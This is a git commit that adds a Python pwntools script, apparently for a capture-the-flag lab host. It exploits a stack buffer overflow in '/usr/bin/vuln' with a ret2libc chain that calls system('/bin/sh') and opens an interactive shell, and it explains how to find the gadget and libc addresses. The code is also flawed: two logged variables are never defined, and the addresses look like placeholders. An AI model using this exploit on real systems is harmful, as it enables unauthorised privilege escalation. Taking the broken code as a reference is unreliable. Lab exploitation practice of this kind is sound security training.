bfb4eb7513094bd6a4f62bc72691503121412cf4
bl1ndh4ck3r <54369823+bl1ndh4ck3r@users.noreply.github.com>
2019-11-04 01:50:34 +0530

    Create test.py

---
+++ test.py
@@ -0,0 +1,19 @@
+from pwn import *
+
+s = ssh(host = '10.10.10.139')
+p = s.process('/usr/bin/vuln')
+padding = ("A" * 136).encode()
+#ropper --file garbage --search "pop rdi; ret;"
+pop_rdi = p64(0x138C54A1) 
+#Get these libc addresses from libc.so.6
+#/usr/lib/x86_64-linux-gnu
+#readelf -s libc.so.6 | grep system
+libc_system = p64(0xAB765F80)
+#strings -a -t x libc.so.6 | grep /bin/sh
+libc_binsh = p64(0x5643AB89) 
+log.info(f'System: {system_loc.hex()}')
+log.info(f'/bin/sh: {binsh_loc.hex()}')
+payload_rce = padding
+payload_rce += pop_rdi + libc_binsh + libc_system
+p.sendline(payload_rce)
+p.interactive()
